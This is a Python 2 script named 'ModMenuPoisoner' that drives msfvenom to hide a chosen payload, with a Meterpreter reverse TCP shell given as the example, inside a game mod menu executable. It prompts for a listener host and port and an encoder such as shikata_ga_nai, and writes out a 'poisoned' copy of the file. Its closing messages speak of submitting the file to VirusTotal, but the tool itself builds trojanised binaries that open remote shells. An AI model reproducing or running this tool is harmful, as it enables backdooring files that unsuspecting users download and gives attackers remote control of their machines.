#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
# from termcolor import colored
import sys
import StringIO
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen



# os.system('cat /root/ModMenuPoisoner/banner.txt')

def poison_mod():
    input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))

    # payload_Generate = 'windows/meterpreter_reverse_tcp'
    payload_Generate = str(raw_input("Enter the type of payload you want to use: "))
    # LHOST = '8.8.8.8'
    LHOST = str(raw_input("Enter Listening Host: "))
    # LPORT = '443'
    LPORT = str(raw_input("Enter Listening Port: "))
    # input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
    bad_Bytes = 'x00'
    # payload_Encoder = 'x86/shikata_ga_nai'
    payload_Encoder = str(raw_input("Enter Encoder TYPE: "))
    # payload_Iterations = '1'
    payload_Iterations = str(raw_input("Enter number of iterations: "))
    # output_Format = 'exe'
    output_Format = str(raw_input("Enter output format: "))
    output_Dir = '/root/Documents/ModMenusReencoded/'
    # Lets just keep the code simple, all the user has to do is copy and paste the file path, and rename the file
    output_Name = os.path.basename(input_Mod_Menu)
    output_File = output_Dir + output_Name

    cmd_String = "msfvenom -p {0} LHOST={1} LPORT={2} -x {3} -b '\{4}' -e {5} -i {6} -f {7} -o {8}".format(
        payload_Generate,
        LHOST,
        LPORT,
        input_Mod_Menu,
        bad_Bytes,
        payload_Encoder,
        payload_Iterations,
        output_Format,
        output_File
    )
    print 'Now running command: ' + cmd_String
    os.system(cmd_String)
    print 'Poisoned Mod Menu file generated, please see: ' + output_File + ' to submit it to VirusTotal!'
    print 'DISCLAIMER: Please wait up to 2 weeks so that all the AV solutions will begin accusing it of being a virus and get it auto-deleted on their machines'
    main()

def list_all():
    opt_List = [
        '#0. Return to Main Menu',
        '#1. List all Encoders',
        '#2. List all Payloads',
        '#3. List all Output Formats',
        '#4. List all Architectures'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        os.system('clear')
        cmd_String = "msfvenom --list encoders"
        os.system(cmd_String)
        list_all()
    elif opt_Choice == "2":
        os.system('clear')
        cmd_String = "msfvenom --list payloads"
        os.system(cmd_String)
        list_all()
    elif opt_Choice == "3":
        os.system('clear')
        cmd_String = "msfvenom --help-formats"
        os.system(cmd_String)
        list_all()
    elif opt_Choice == "4":
        os.system('clear')
        cmd_String = "msfvenom --help-platforms"
        os.system(cmd_String)
        list_all()
    return

def main():
    opt_List = [
        '\n\t#0. Return to Mod Menu Poisoner Main Menu',
        '#1. Run the Custom Poisoner',
        '#2. (RECOMMENDED READ), List all available encoders, payloads, output formats'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "0":
        os.system('python /root/ModMenuPoisoner/ModMenuPoisoner.py')
    elif opt_Choice == "1":
        os.system('clear')
        poison_mod()
    elif opt_Choice == "2":
        os.system('clear')
        list_all()

    else:
        print 'You have entered a invalid option'
        main()
    return
main()
